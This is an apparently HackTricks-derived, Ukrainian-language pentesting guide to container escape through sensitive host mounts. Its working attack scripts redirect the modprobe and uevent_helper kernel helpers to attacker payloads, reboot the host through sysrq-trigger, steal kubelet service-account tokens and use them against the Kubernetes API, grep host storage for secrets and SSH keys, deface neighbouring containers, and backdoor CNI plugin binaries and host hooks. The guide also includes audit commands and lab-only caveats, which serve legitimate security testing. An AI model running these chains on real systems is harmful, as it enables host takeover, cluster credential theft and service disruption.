# Чутливі монтування хоста

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Монтування хоста є однією з найважливіших практичних поверхонь для escape з контейнера, оскільки вони часто зводять нанівець ретельно ізольоване представлення процесів, знову відкриваючи прямий доступ до ресурсів хоста. Небезпечні випадки не обмежуються `/`. Bind mounts для `/proc`, `/sys`, `/var`, runtime sockets, стану, яким керує kubelet, або шляхів, пов’язаних із пристроями, можуть розкрити елементи керування kernel, credentials, файлові системи сусідніх контейнерів і інтерфейси керування runtime.

Ця сторінка існує окремо від окремих сторінок захисту, оскільки модель зловживання є наскрізною. Writable host mount є небезпечним частково через mount namespaces, частково через user namespaces, частково через покриття AppArmor або SELinux, а також через те, який саме шлях хоста було відкрито. Розгляд цієї теми окремо значно спрощує аналіз attack surface.

## Відкритий доступ до `/proc`

procfs містить як звичайну інформацію про процеси, так і критично важливі інтерфейси керування kernel. Тому bind mount на кшталт `-v /proc:/host/proc` або представлення контейнера, яке відкриває неочікувані writable entries у proc, може призвести до розкриття інформації, denial of service або прямого виконання коду на хості.

Важливі шляхи procfs включають:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (особливо `register` і `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Зловживання

Почніть із перевірки, які важливі записи procfs доступні для перегляду або запису:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ці шляхи цікаві з різних причин. `core_pattern`, `modprobe` і `binfmt_misc` можуть стати шляхами до виконання коду на хості, якщо доступні для запису. `kallsyms`, `kmsg`, `kcore` і `config.gz` є потужними джерелами розвідданих для kernel exploitation. `sched_debug` і `mountinfo` розкривають контекст процесів, cgroup і файлової системи, що може допомогти відтворити структуру хоста зсередини контейнера.

Практична цінність кожного шляху відрізняється, і розглядати їх так, ніби вони мають однаковий вплив, ускладнює triage:

- `/proc/sys/kernel/core_pattern`
Якщо доступний для запису, це один із найнебезпечніших шляхів через procfs, оскільки після збою kernel виконає pipe handler. Контейнер, який може вказати в `core_pattern` на payload, збережений у його overlay або в підключеному шляху хоста, часто може отримати виконання коду на хості. Див. також [read-only-paths.md](protections/read-only-paths.md) для окремого прикладу.
- `/proc/sys/kernel/modprobe`
Цей шлях керує userspace helper, який використовує kernel, коли потрібно запустити логіку завантаження модулів. Якщо він доступний для запису з контейнера та інтерпретується в контексті хоста, він може стати ще одним primitive для виконання коду на хості. Особливо цікавим він є в поєднанні зі способом trigger цього helper.
- `/proc/sys/vm/panic_on_oom`
Зазвичай це не є чистим primitive для escape, але він може перетворити memory pressure на denial of service для всього хоста, перетворюючи умови OOM на поведінку kernel panic.
- `/proc/sys/fs/binfmt_misc`
Якщо інтерфейс реєстрації доступний для запису, attacker може зареєструвати handler для вибраного magic value та отримати виконання в контексті хоста під час запуску відповідного файлу.
- `/proc/config.gz`
Корисний для triage kernel exploit. Допомагає визначити, які підсистеми, mitigation та додаткові kernel features увімкнені, без необхідності отримувати metadata пакетів хоста.
- `/proc/sysrq-trigger`
Переважно шлях до denial of service, але дуже серйозний. Він може негайно перезавантажити хост, спричинити panic або іншим чином порушити його роботу.
- `/proc/kmsg`
Розкриває повідомлення kernel ring buffer. Корисний для fingerprinting хоста, аналізу збоїв і, у деяких середовищах, для leak інформації, корисної для kernel exploitation.
- `/proc/kallsyms`
Цінний, якщо доступний для читання, оскільки розкриває інформацію про експортовані kernel symbols і може допомогти обійти припущення щодо address randomization під час розробки kernel exploit.
- `/proc/[pid]/mem`
Це прямий інтерфейс до пам'яті процесу. Якщо цільовий процес доступний за необхідних умов у стилі ptrace, це може дозволити читати або змінювати пам'ять іншого процесу. Реальний вплив значною мірою залежить від credentials, `hidepid`, Yama та обмежень ptrace, тому це потужний, але conditional шлях.
- `/proc/kcore`
Надає view системної пам'яті у форматі, подібному до core image. Файл величезний і незручний у використанні, але якщо він фактично доступний для читання, це свідчить про серйозно exposed memory surface хоста.
- `/dev/kmem` і `/dev/mem`
Історично це raw-memory **device** interfaces із високим впливом, а не файли procfs. У багатьох сучасних системах вони відсутні або жорстко обмежені, але контейнер, який може відкрити підключену копію з хоста, має розглядати таке exposure як critical. Перевіряйте їх разом з іншими чутливими mount у `/dev`, а не шукайте неіснуючі шляхи `/proc/kmem` або `/proc/mem`.
- `/proc/sched_debug`
Leak-ить інформацію про scheduling і tasks, яка може розкрити identities процесів хоста, навіть коли інші представлення процесів виглядають чистішими, ніж очікувалося.
- `/proc/[pid]/mountinfo`
Надзвичайно корисний для відтворення того, де насправді розташований контейнер на хості, які шляхи підтримуються overlay і чи відповідає writable mount вмісту хоста, чи лише шару контейнера.

Якщо `/proc/[pid]/mountinfo` або overlay details доступні для читання, використовуйте їх, щоб відновити шлях хоста до файлової системи контейнера:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ці команди корисні, оскільки низка трюків для виконання на host вимагає перетворення шляху всередині container на відповідний шлях з точки зору host.

### Приклад: підготовка шляху помічника `modprobe`

Якщо `/proc/sys/kernel/modprobe` доступний для запису з container, а шлях до помічника інтерпретується в контексті host, його можна перенаправити на payload, контрольований attacker. Верхній каталог overlay має бути визначений з host, а proof output потрібно записати назад у той самий видимий для host шар container, якщо container також не монтує host `/tmp`:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
Точний тригер залежить від цілі та поведінки kernel, і навмисно не вгадується. Відновіть початкове значення перед виходом із лабораторного середовища. Важливо те, що доступний для запису helper path може перенаправити майбутній виклик kernel helper до вмісту host path, контрольованого attacker. Відсутній `upperdir` overlay, шлях, який host не може resolve, монтування sysctl лише для читання або kernel, який ніколи не викликає вибраний helper, руйнує цей ланцюжок.

### Повний приклад: Kernel Recon за допомогою `kallsyms`, `kmsg` і `config.gz`

Якщо метою є оцінювання exploitability, а не негайний escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ці команди допомагають визначити, чи видима корисна інформація про символи, чи розкривають останні повідомлення kernel цікавий стан і які функції kernel або mitigation скомпільовані. Вплив зазвичай не полягає в безпосередньому escape, але це може суттєво скоротити час triage kernel-вразливості.

### Full Example: SysRq Перезавантаження Host

Якщо `/proc/sysrq-trigger` доступний для запису та досягає представлення host:
```bash
echo b > /proc/sysrq-trigger
```
Ефектом є негайне перезавантаження хоста. Це не тонкий приклад, але він чітко демонструє, що exposed procfs може бути набагато серйознішим за розкриття інформації.

## Відкритий доступ до `/sys`

sysfs розкриває значні обсяги інформації про стан ядра та пристроїв. Деякі шляхи sysfs переважно корисні для fingerprinting, тоді як інші можуть впливати на виконання helper-програм, поведінку пристроїв, конфігурацію security-модулів або стан firmware.

До sysfs-шляхів із високою цінністю належать:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ці шляхи важливі з різних причин. `/sys/class/thermal` може впливати на поведінку керування температурою, а отже — на стабільність хоста в середовищах із неналежним рівнем exposure. `/sys/kernel/vmcoreinfo` може leak-нути інформацію про crash dump і структуру пам’яті ядра, що допомагає під час low-level fingerprinting хоста. `/sys/kernel/security` є інтерфейсом `securityfs`, який використовують Linux Security Modules, тому неочікуваний доступ до нього може розкрити або змінити стан, пов’язаний із MAC. Шляхи до EFI-змінних можуть впливати на налаштування завантаження, що зберігаються у firmware, тому вони значно небезпечніші за звичайні конфігураційні файли. `debugfs` у `/sys/kernel/debug` особливо небезпечний, оскільки це навмисно орієнтований на розробників інтерфейс із набагато менш суворими вимогами безпеки, ніж у hardened kernel API, призначених для production.

Кожен sysfs-запис у цьому списку залежить від **ядра, конфігурації та обладнання**. У сучасних virtualized nodes часто повністю відсутні `uevent_helper`, EFI-змінні та записи thermal-пристроїв. Фіксуйте відсутній шлях як негативну передумову, а не припускайте, що приклад з іншого ядра застосовний.

Корисні команди для перевірки цих шляхів:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Що робить ці команди цікавими:

- `/sys/kernel/security` може показати, чи доступна поверхня AppArmor, SELinux або іншого LSM у спосіб, який мав залишатися доступним лише хосту.
- `/sys/kernel/debug` часто є найбільш тривожною знахідкою в цій групі. Якщо `debugfs` змонтовано та доступно для читання або запису, очікуйте широку поверхню взаємодії з kernel, точний ризик якої залежить від увімкнених debug-вузлів.
- Доступ до EFI-змінних трапляється рідше, але має високий вплив, оскільки стосується налаштувань, що зберігаються у firmware, а не звичайних runtime-файлів.
- `/sys/class/thermal` переважно має значення для стабільності хоста та взаємодії з hardware, а не для акуратного shell-style escape.
- `/sys/kernel/vmcoreinfo` переважно є джерелом host-fingerprinting і crash analysis, корисним для розуміння низькорівневого стану kernel.

### Повний приклад: `uevent_helper`

`/sys/kernel/uevent_helper` залежить від kernel і конфігурації та відсутній у багатьох сучасних системах. Якщо він існує, доступний для запису, а доступний придатний `uevent` trigger, kernel може виконати helper, контрольований attacker'ом. Proof output має використовувати шлях, видимий як із view хоста, так і з view контейнера:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
Причина, чому це працює, полягає в тому, що шлях до helper інтерпретується з точки зору host. Після запуску helper виконується в контексті host, а не всередині поточного container. `/sys/class/mem/null/uevent` є одним конкретним trigger на kernel, які його відкривають; інші devices можуть відкривати власні файли `uevent`, але не обирайте один навмання на реальному hardware. Відновіть початкове значення перед виходом із lab. Не повідомляйте про доступність цієї technique, якщо helper-файл або контрольований trigger відсутній.

## Відкриття `/var`

Mounting `/var` host у container часто недооцінюють, оскільки це не виглядає так драматично, як mounting `/`. На практиці цього може бути достатньо, щоб отримати доступ до runtime sockets, директорій container snapshots, volumes pod, якими керує kubelet, projected service-account tokens, а також файлових систем сусідніх applications. На сучасних nodes саме `/var` часто містить найбільш цікаві з операційної точки зору дані про стан containers.

### Приклад Kubernetes

Pod із `hostPath: /var` часто може читати projected tokens інших pods і вміст overlay snapshots:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ці команди корисні, оскільки вони показують, чи монтування відкриває доступ лише до неважливих даних застосунку, чи до високопривілейованих облікових даних кластера. Доступний для читання токен service-account може негайно перетворити локальне виконання коду на доступ до Kubernetes API.

Якщо токен присутній, перевірте, до яких ресурсів він має доступ, замість того щоб зупинятися на виявленні токена:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Вплив тут може бути значно більшим, ніж доступ до локального вузла. Токен із широкими дозволами RBAC може перетворити змонтований `/var` на компрометацію всього кластера.

### Приклад Docker і containerd

На хостах Docker відповідні дані часто розташовані в `/var/lib/docker`, тоді як на вузлах Kubernetes із containerd вони можуть знаходитися в `/var/lib/containerd` або у шляхах, специфічних для snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Якщо змонтований `/var` відкриває доступ до доступного для запису вмісту snapshot іншого workload, attacker може змінити файли застосунку, розмістити web-контент або змінити startup-скрипти, не торкаючись поточної конфігурації container.

У **disposable lab workload** доступний для запису вміст snapshot може продемонструвати tampering застосунку, відновлення secret або lateral movement. Спочатку зіставте ID runtime container із точним snapshot і ніколи не редагуйте сторонній або production snapshot:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
Ці команди корисні, оскільки показують три основні категорії впливу змонтованого `/var`: втручання в роботу застосунків, відновлення секретів і lateral movement до сусідніх workloads.

Прямий запис у snapshot обходить стандартне керування станом runtime та може пошкодити контейнер або знищити докази. Read-only discovery було локально відтворено для Docker `overlay2`: marker, записаний у сусідньому disposable container, з'явився в `/var/lib/docker/overlay2/<id>/diff/`. Фактичну модифікацію snapshot слід обмежити disposable container, створеним для цього тесту.

## Стан Kubelet, плагіни та шляхи CNI

Монтування `/var/lib/kubelet`, `/opt/cni/bin` або `/etc/cni/net.d` часто доступне через privileged DaemonSets, CNI agents, CSI node plugins, GPU operators і storage helpers. Такі монтування легко відкинути як "node plumbing", але вони безпосередньо залучені до шляху виконання для нових pod'ів і часто містять credentials Kubelet, projected secrets, registration sockets та executable host-side plugin binaries.

Цінні цілі включають:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Корисні команди для перевірки:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Чому ці шляхи важливі:

- `/var/lib/kubelet/pki` може розкрити client certificates kubelet та інші локальні облікові дані вузла, які іноді можна повторно використати проти API server або TLS endpoints, доступних kubelet, залежно від дизайну кластера.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` часто містить projected service-account tokens і змонтовані Secrets для сусідніх pod на тому самому вузлі.
- `/var/lib/kubelet/pod-resources/kubelet.sock` переважно є поверхнею для reconnaissance, але дуже корисною: він показує, які pod і containers наразі володіють GPU, hugepages, SR-IOV devices та іншими дефіцитними локальними ресурсами вузла.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` і `/var/lib/kubelet/plugins_registry` показують, які CSI, DRA та device plugins встановлені, а також з якими sockets має взаємодіяти kubelet. Якщо ці директорії доступні для запису, а не лише для читання, finding стає значно серйознішим.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` і `/etc/cni/net.d` безпосередньо задіяні в процесі налаштування pod-network. Доступ на запис до них часто є відкладеним примітивом для host execution, а не просто розкриттям конфігурації.<sup>[[2]](#references)</sup>

### Повний приклад: доступний для запису `/opt/cni/bin`

Якщо host CNI binary directory змонтована з доступом на запис, заміни plugin може бути достатньо для отримання host execution наступного разу, коли kubelet створить pod sandbox на цьому вузлі:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
Це не настільки безпосередньо, як змонтований `docker.sock`, але часто є реалістичнішим варіантом у скомпрометованих Kubernetes infrastructure pods. Маркер записується поруч зі змонтованим plugin, щоб container міг отримати його навіть без mount до host-root або host-`/tmp`. Wrapper зберігає оригінальні аргументи та стандартне введення, після чого приклад відновлює оригінальний binary. Важливо, що змінений binary згодом виконується flow налаштування host network, а не поточним container. Використовуйте лише disposable node, оскільки некоректний wrapper може перешкодити отриманню мережі новими Pod sandboxes.

## Runtime Sockets

Sensitive host mounts часто містять runtime sockets, а не повні директорії. Вони настільки важливі, що заслуговують на окреме повторне згадування тут:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Див. [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md), щоб ознайомитися з повними сценаріями exploitation після монтування одного з цих сокетів.

Як швидкий шаблон першої взаємодії:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Якщо один із них спрацьовує, шлях від "mounted socket" до "start a more privileged sibling container" зазвичай набагато коротший, ніж будь-який шлях до kernel breakout.

## Writable Host Path Task Hijack

Writable host mount не обов’язково має відкривати доступ до `/`, щоб бути небезпечним. Якщо змонтований шлях містить скрипти, конфігураційні файли, hooks, plugins або файли, які пізніше використовуються host-side scheduled task чи service, container може отримати можливість змінити те, що виконує host.

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Якщо host process використовує writable file, під час тестування тримайте payload простим і таким, за яким легко спостерігати:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Цікава частина — це межа довіри: запис виконується зсередини контейнера, але виконання відбувається пізніше в контексті сервісу на host. Це перетворює вузький hostPath або bind mount на примітив відкладеного виконання коду на host.

## CVE, пов’язані з mount

Mount-и host також перетинаються з уразливостями runtime. Серед важливих нещодавніх прикладів:

- `CVE-2024-21626` у `runc`, де витік дескриптора файлу директорії міг розмістити робочу директорію у файловій системі host.
- `CVE-2024-23651`, `CVE-2024-23652` і `CVE-2024-23653` у BuildKit, де шкідливі Dockerfile, frontend-и та потоки `RUN --mount` могли повторно надати доступ до файлів host, дозволити їх видалення або отримання підвищених привілеїв під час build.
- `CVE-2024-1753` у Buildah і потоках build у Podman, де спеціально створені bind mount-и під час build могли відкрити `/` для читання й запису.
- `CVE-2025-47290` у `containerd` 2.1.0, де TOCTOU під час розпакування image міг дозволити спеціально створеному image змінити файлову систему host під час pull.

Ці CVE важливі тут, оскільки показують, що робота з mount — це не лише питання конфігурації оператора. Сам runtime також може створювати умови для escape через mount.

## Перевірки

Використовуйте ці команди, щоб швидко знайти mount-и з найвищим рівнем ризику:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Що тут цікаво:

- Host root, `/proc`, `/sys`, `/var` і runtime sockets — усе це findings з найвищим пріоритетом.
- Записи proc/sys, доступні для запису, часто означають, що mount відкриває глобальні для host kernel controls, а не безпечне container view.
- Змонтовані шляхи `/var` потребують перевірки credentials і сусідніх workloads, а не лише аналізу файлової системи.
- Директорії зі станом Kubelet і шляхи CNI/plugins мають такий самий пріоритет, як і runtime sockets, оскільки часто безпосередньо пов’язані зі створенням pods на node та розповсюдженням credentials.

## Local Validation Status

Практичні chains на цій сторінці перевірялися на локальному Linux minikube node. Під час validation було відтворено:

- доступ на читання та запис через тимчасовий writable hostPath
- виявлення projected ServiceAccount tokens і змонтованих Secrets через `/var/lib/kubelet/pods`
- успішну authentication у Kubernetes API за допомогою live token, отриманого зі змонтованого kubelet state
- read-only discovery сусідньої Docker `overlay2` filesystem через змонтований `/var`
- створення Docker API sibling container із read-only host bind через змонтований `docker.sock`
- відкладене виконання на host через тимчасовий hook, який споживає host
- simulation CNI-wrapper, що зберегла arguments, standard input і execution оригінального plugin

На тому самому node були доступні `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` і `config.gz`, але не були доступні `uevent_helper`, EFI variables, thermal entries або `sched_debug`. Destructive kernel triggers не виконувалися. Це підтверджує, що chains через host-root, `/var`, kubelet-state, sockets і host-consumer можна відтворити, тоді як helper techniques для procfs/sysfs мають залишатися залежними від конкретних kernel, mount mode, payload path і trigger.

## References

- [1] [Локальні файли та шляхи, які використовує Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Контейнер cilium-agent може отримати доступ до host через mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
